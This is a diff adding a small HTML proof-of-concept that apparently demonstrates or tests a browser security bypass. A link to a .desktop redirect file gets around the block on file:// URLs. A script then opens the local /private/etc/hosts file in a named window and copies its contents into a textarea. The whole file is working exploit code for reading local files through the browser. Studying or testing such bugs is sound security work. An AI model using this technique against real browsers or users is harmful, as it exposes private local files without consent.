@@ -1,0 +1,18 @@
+<a href="redir.desktop" target="qab" id="qAnchor">
+	With .url (will bypass)</a>
+<br>
+<a href="file:///private/etc/hosts" target="qab" id="qAnchor">Without .url (will be blocked)</a>
+<br>
+<textarea style="width:600px;height:700px;" id="qresult"></textarea>
+<script>
+	var q;
+	qAnchor.onclick = function () {
+		setTimeout(function () {
+			q = open('file:///private/etc/hosts#1', 'qab');
+
+			setTimeout(function () {
+				qresult.value = q.document.body.innerHTML;
+			}, 500);
+		}, 500);
+	}
+</script>
